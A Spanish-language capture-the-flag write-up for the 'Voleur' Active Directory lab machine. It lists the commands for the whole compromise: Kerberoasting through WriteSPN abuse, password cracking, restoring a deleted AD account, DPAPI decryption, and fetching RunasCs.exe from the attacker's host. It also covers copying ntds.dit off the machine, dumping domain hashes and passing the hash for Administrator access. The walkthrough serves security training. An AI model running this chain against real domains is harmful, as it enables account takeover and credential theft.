# Máquina: Voleur

- **Sistema Operativo:** Windows / Linux (WSL)
- **Dificultad:** Media / Difícil
- **Técnicas clave:** Entorno Kerberos-only (NTLM deshabilitado), Enumeración SMB (`spider_plus`), Cracking de Excel protegido (`office2john` + `msoffcrypto-tool`), Abuso de `WriteSPN`, Kerberoasting con TGS, Evil-WinRM con Kerberos, Ejecución con `RunasCs.exe`, Restauración de objetos eliminados (`Restore-ADObject`), Desencriptación de DPAPI (`dpapi.py`), SSH a WSL en puerto 2222, `sudo NOPASSWD: ALL`, Volcado offline de NTDS (`secretsdump.py`), Obtención de TGT con hash (`getTGT.py`)

---

![Voleur](assets/Pasted%20image%2020260924211331.png)

> **Contexto inicial:** Como es habitual en auditorías de Active Directory corporativas, iniciamos la máquina con credenciales iniciales de un empleado de la organización: `ryan.naylor` / `HollowOct31Nyt`.

## Fase 1: Reconocimiento y Enumeración

Iniciamos con un escaneo exhaustivo de puertos utilizando Nmap:

```bash
sudo nmap -sVC --min-rate 5000 -n -Pn -sS 10.129.232.130 -oN escaneo
```

```text
Nmap scan report for 10.129.232.130
Host is up (0.14s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-25 05:15:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time:
|   date: 2026-09-25T05:15:44
|_  start_date: N/A
|_clock-skew: 7h59m59s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```

Configuramos la resolución DNS añadiendo `voleur.htb` y `dc.voleur.htb` a `/etc/hosts`:

![Configuración DNS](assets/Pasted%20image%2020260924212051.png)

### Identificación de NTLM Deshabilitado y Configuración Kerberos

Al intentar autenticarnos con NetExec descubrimos que NTLM se encuentra totalmente deshabilitado (`NTLM:False`):

![NTLM Deshabilitado](assets/Pasted%20image%2020260925054344.png)

![Error NetExec NTLM](assets/Pasted%20image%2020260925054504.png)

Dado que NetExec utiliza NTLM de forma predeterminada, debemos forzar la autenticación exclusiva por Kerberos.

Sincronizamos la hora con el controlador de dominio para evitar desfases temporales en Kerberos:

```bash
sudo ntpdate -u DC.voleur.htb
```

![Sincronización NTP](assets/Pasted%20image%2020260925054616.png)

Generamos el archivo de configuración Kerberos mediante NetExec y lo exportamos:

```bash
netexec smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -d voleur.htb -k --generate-krb5-file voleur.krb5
export KRB5_CONFIG=voleur.krb5
```

Validamos la autenticación Kerberos exitosa:

```bash
netexec smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -d voleur.htb -k
```

![Autenticación Kerberos NetExec](assets/Pasted%20image%2020260925054826.png)

Listamos los recursos compartidos:

```bash
netexec smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -d voleur.htb -k --shares
```

![Shares SMB](assets/Pasted%20image%2020260925054944.png)

### Rastreo SMB y Análisis de Excel Protegido

Rastreamos todos los archivos accesibles en los recursos compartidos con el módulo `spider_plus`:

```bash
nxc smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -d voleur.htb -k -M spider_plus
```

![Spider Plus](assets/Pasted%20image%2020260925060132.png)

Revisamos el archivo JSON generado:

```bash
cat /home/javikrd/.nxc/modules/nxc_spider_plus/DC.voleur.htb.json | python3 -m json.tool
```

![Resultado Spider Plus](assets/Pasted%20image%2020260925060352.png)

Identificamos el archivo `Access_Review.xlsx` dentro de la carpeta `First-Line Support` del recurso `IT`.

Solicitamos un ticket TGT con `kinit` y exportamos el cache:

```bash
kinit ryan.naylor@VOLEUR.HTB
export KRB5CCNAME=/tmp/krb5cc_1000
```

Descargamos el archivo con `smbclient` utilizando autenticación Kerberos obligatoria:

```bash
smbclient //DC.voleur.htb/IT -U ryan.naylor --use-kerberos=required --use-krb5-ccache=/tmp/krb5cc_1000 -c 'cd "First-Line Support"; get Access_Review.xlsx'
```

![Descarga Access_Review.xlsx](assets/Pasted%20image%2020260925060627.png)

![Archivo Descargado](assets/Pasted%20image%2020260925060713.png)

El libro de Excel está protegido con contraseña. Utilizamos una versión local de `office2john.py` (sustituyendo `getiterator()` por `iter()` para compatibilidad con Python 3.9+) y extraemos el hash:

```bash
cp /usr/bin/office2john ~/voleu/loot/office2john_fixed.py
sed -i 's/getiterator/iter/g' ~/voleu/loot/office2john_fixed.py
python3 ~/voleu/loot/office2john_fixed.py Access_Review.xlsx > excel.hash
```

![Parche office2john](assets/Pasted%20image%2020260925061251.png)

Crackeamos el hash con John the Ripper y `rockyou.txt`:

```bash
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt excel.hash
```

![Crackeo con John](assets/Pasted%20image%2020260925061434.png)

La contraseña descubierta es **`football1`**.

Desencriptamos el archivo utilizando `msoffcrypto-tool` en un entorno virtual de Python:

```bash
python3 -m venv ~/venvs/office
source ~/venvs/office/bin/activate
pip install msoffcrypto-tool openpyxl
```

```python
import msoffcrypto

f = open('Access_Review.xlsx', 'rb')
office_file = msoffcrypto.OfficeFile(f)
office_file.load_key(password='football1')
with open('Access_Review_decrypted.xlsx', 'wb') as out:
    office_file.decrypt(out)
```

![Desencriptación Excel](assets/Pasted%20image%2020260925062325.png)

Leemos el contenido de las hojas con `openpyxl`:

```python
import openpyxl

wb = openpyxl.load_workbook('Access_Review_decrypted.xlsx', data_only=True)
for sheet in wb.sheetnames:
    ws = wb[sheet]
    print(f'--- Sheet: {sheet} ---')
    for row in ws.iter_rows(values_only=True):
        print(row)
```

![Credenciales extraídas](assets/Pasted%20image%2020260925062658.png)

**Credenciales encontradas:**
- `svc_ldap` : `M1XyC9pW7qT5Vn`
- `svc_iis` : `N5pXyW1VqM7CZ8`
- `Todd.Wolfe` : `NightT1meP1dg3on14` *(cuenta marcada como eliminada)*

Validamos las cuentas funcionales por SMB/LDAP con Kerberos:

```bash
nxc smb DC.voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -d voleur.htb -k
nxc smb DC.voleur.htb -u 'svc_iis' -p 'N5pXyW1VqM7CZ8' -d voleur.htb -k
```

## Acceso Inicial (User Flag)

### Recolección de Datos con BloodHound

Recolectamos la información del dominio como `svc_ldap`:

```bash
bloodhound-ce-python -u svc_ldap -p 'M1XyC9pW7qT5Vn' -d voleur.htb -k -ns 10.129.232.130 -c all --zip --dns-tcp
```

![BloodHound Dump](assets/Pasted%20image%2020260925063152.png)

Al analizar las relaciones en BloodHound descubrimos que **`svc_ldap` tiene privilegios `WriteSPN` sobre la cuenta `svc_winrm`**:

![BloodHound WriteSPN](assets/Pasted%20image%2020260925063519.png)

### Abuso de WriteSPN y Ataque de Kerberoasting

Aprovechando `WriteSPN`, añadimos un Service Principal Name falso a `svc_winrm` con `bloodyAD`:

```bash
kinit svc_ldap@VOLEUR.HTB
bloodyAD --host DC.voleur.htb -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k set object svc_winrm servicePrincipalName -v 'fake/spn'
```

![Asignación de SPN](assets/Pasted%20image%2020260925064855.png)

Solicitamos el ticket TGS correspondiente con `GetUserSPNs.py`:

```bash
GetUserSPNs.py voleur.htb/svc_ldap:'M1XyC9pW7qT5Vn' -dc-host DC.voleur.htb -k -no-pass -request
```

![Solicitud TGS](assets/Pasted%20image%2020260925064932.png)

Guardamos el ticket TGS en `hash.txt` y lo crackeamos con Hashcat:

```bash
hashcat -m 13100 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

![Hashcat Crack TGS](assets/Pasted%20image%2020260925065048.png)

![Contraseña crackeada](assets/Pasted%20image%2020260925065426.png)

La contraseña de `svc_winrm` es: **`AFireInsidedeOzarctica980219afi`**.

### Conexión Evil-WinRM vía Kerberos

Debido a que `nxc winrm` solo soporta NTLM internamente, utilizamos `evil-winrm` con el soporte Kerberos habilitado a través de `pywinrm[kerberos]`:

```bash
sudo pacman -S krb5
python3 -m pip install pywinrm[kerberos] --break-system-packages
```

Solicitamos el TGT para `svc_winrm`:

```bash
kinit svc_winrm@VOLEUR.HTB
```

Nos conectamos con Evil-WinRM:

```bash
evil-winrm -i DC.voleur.htb -r VOLEUR.HTB
```

![Sesión Evil-WinRM](assets/Pasted%20image%2020260925070302.png)

Capturamos la flag de usuario (`user.txt`):

```text
10d4d57ddeb82169e55f76f1223f7369
```

## Movimiento Lateral y Escalada de Privilegios

### Restauración de Objeto Eliminado con RunasCs

En BloodHound observamos que `svc_ldap` es miembro del grupo privilegiado **`RESTORE_USERS@VOLEUR.HTB`**:

![Grupo RESTORE_USERS](assets/Pasted%20image%2020260925072928.png)

Recordando que en el Excel existía la cuenta `Todd.Wolfe` (indicada como eliminada), podemos restaurarla. Para ejecutar comandos con los permisos de `svc_ldap` desde nuestra sesión activa de `svc_winrm`, subimos **`RunasCs.exe`**:

```powershell
Invoke-WebRequest -Uri http://10.10.14.240:8000/RunasCs.exe -OutFile RunasCs.exe
```

![Subida RunasCs](assets/Pasted%20image%2020260925073410.png)

Enumeramos los objetos eliminados en Active Directory:

```powershell
.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-ADObject -Filter 'isDeleted -eq `$true' -IncludeDeletedObjects -Properties distinguishedName, objectSid -SearchBase 'CN=Deleted Objects,DC=voleur,DC=htb'"
```

![Enumeración Objetos Eliminados](assets/Pasted%20image%2020260925073506.png)

Localizamos el objeto `CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db` y lo restauramos:

```powershell
.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Restore-ADObject 'CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb'"
```

![Restauración Exitosa](assets/Pasted%20image%2020260925073834.png)

Con la cuenta restaurada, solicitamos un ticket Kerberos para `todd.wolfe` con la contraseña encontrada previamente en el Excel (`NightT1meP1dg3on14`):

```bash
kinit todd.wolfe@VOLEUR.HTB
```

![Ticket Todd Wolfe](assets/Pasted%20image%2020260925074248.png)

Validamos sus recursos compartidos accesibles:

```bash
nxc smb DC.voleur.htb -u 'todd.wolfe' -p 'NightT1meP1dg3on14' -d voleur.htb -k --shares
```

![Shares Todd Wolfe](assets/Pasted%20image%2020260925074417.png)

### Extracción de Credenciales DPAPI

Nos conectamos con `smbclient` al recurso compartido `IT`:

```bash
smbclient //DC.voleur.htb/IT -U 'todd.wolfe%NightT1meP1dg3on14' --use-kerberos=required
```

![Acceso Carpeta IT](assets/Pasted%20image%2020260925074830.png)

Navegamos a `AppData\Roaming\Microsoft\Credentials` y encontramos un archivo de credenciales cifrado con DPAPI:

![Archivo Credencial DPAPI](assets/Pasted%20image%2020260925075013.png)

Descargamos el credential blob (`772275FAD58525253490A9B0039791D3`) y la MasterKey ubicada en el directorio `Protect`:

![MasterKey DPAPI](assets/Pasted%20image%2020260925075505.png)

Desencriptamos la MasterKey utilizando el SID y la contraseña de Todd Wolfe con `dpapi.py`:

```bash
dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
```

![Desencriptación MasterKey](assets/Pasted%20image%2020260925075805.png)

Utilizamos la clave obtenida para desencriptar el credential blob:

```bash
dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

![Credenciales Jeremy Combs](assets/Pasted%20image%2020260925075901.png)

Obtenemos las credenciales del usuario:
- **Usuario:** `jeremy.combs`
- **Contraseña:** `qT3V9pLXyN7W4m`

### Acceso a Jeremy Combs y Descubrimiento de WSL

Solicitamos un TGT para `jeremy.combs` y nos conectamos con Evil-WinRM:

```bash
kinit jeremy.combs@VOLEUR.HTB
evil-winrm -i DC.voleur.htb -r VOLEUR.HTB
```

En el sistema encontramos una clave privada SSH (`id_rsa`) y una nota de texto:

![Clave SSH y Nota](assets/Pasted%20image%2020260925080520.png)

```text
Jeremy,

¡Ya me he hartado de Windows Backup! He configurado parcialmente WSL para ver si podemos utilizar alguna de las herramientas de copia de seguridad de Linux.

Por favor, mira qué puedes configurar.

Gracias,
Administrador
```

![Nota Administrador](assets/Pasted%20image%2020260925080642.png)

La nota confirma la existencia de un subsistema Linux (WSL) expuesto por SSH en el puerto 2222 para tareas de backup asociadas a la cuenta `svc_backup`.

Descargamos la clave privada con Evil-WinRM para asegurar su integridad:

```powershell
download "C:\IT\Third-Line Support\id_rsa" /home/javikrd/voleu/content/id_rsa
```

Ajustamos los permisos y nos conectamos por SSH al puerto 2222:

```bash
chmod 600 id_rsa
ssh -i ~/voleu/content/id_rsa -p 2222 svc_backup@10.129.232.130
```

![Acceso SSH WSL](assets/Pasted%20image%2020260925081421.png)

Comprobamos los privilegios sudo del usuario `svc_backup`:

![Privilegios Sudo](assets/Pasted%20image%2020260925081556.png)

![Sudo NOPASSWD ALL](assets/Pasted%20image%2020260925081719.png)

El usuario tiene **`sudo NOPASSWD: ALL`**, permitiéndonos escalar a root dentro de WSL inmediatamente:

```bash
sudo su -
```

![Root en WSL](assets/Pasted%20image%2020260925081821.png)

### Volcado Offline de NTDS y Root de Dominio

Al inspeccionar los puntos de montaje de Windows en `/mnt/c/`, encontramos las copias de seguridad de Active Directory y del registro:

```text
/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit
/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY
/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM
```

Copiamos los archivos a un directorio temporal:

```bash
mkdir -p /tmp/loot
cp "/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" /tmp/loot/
cp "/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY" /tmp/loot/
cp "/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" /tmp/loot/
```

![Copia de Backups](assets/Pasted%20image%2020260925082241.png)

Transferimos los archivos a nuestra máquina atacante mediante `scp`:

```bash
scp -i ~/voleu/content/id_rsa -P 2222 'svc_backup@10.129.232.130:/tmp/loot/ntds.dit' ~/voleu/content/
scp -i ~/voleu/content/id_rsa -P 2222 'svc_backup@10.129.232.130:/tmp/loot/SYSTEM' ~/voleu/content/
scp -i ~/voleu/content/id_rsa -P 2222 'svc_backup@10.129.232.130:/tmp/loot/SECURITY' ~/voleu/content/
```

![Transferencia SCP](assets/Pasted%20image%2020260925082508.png)

Volcamos los hashes de Active Directory con `secretsdump.py`:

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
```

![Volcado NTDS Offline](assets/Pasted%20image%2020260925082551.png)

Obtenemos el hash NTLM del Administrator:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
```

Dado que NTLM está deshabilitado en el dominio, utilizamos `getTGT.py` de Impacket pasando el hash NTLM para forjar un ticket TGT de Kerberos:

```bash
getTGT.py voleur.htb/administrator -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 -dc-ip 10.129.232.130
export KRB5CCNAME=administrator.ccache
```

Nos conectamos con Evil-WinRM utilizando el ticket Kerberos recién generado:

```bash
evil-winrm -i DC.voleur.htb -r VOLEUR.HTB
```

![Conexión Evil-WinRM Root](assets/Pasted%20image%2020260925082916.png)

Capturamos la flag de root:

![Root Flag](assets/Pasted%20image%2020260925082956.png)

```text
61b2790d3cf5c16f8ec631f3c5a130e2
```

![Voleur Completada](assets/Pasted%20image%2020261014234549.png)
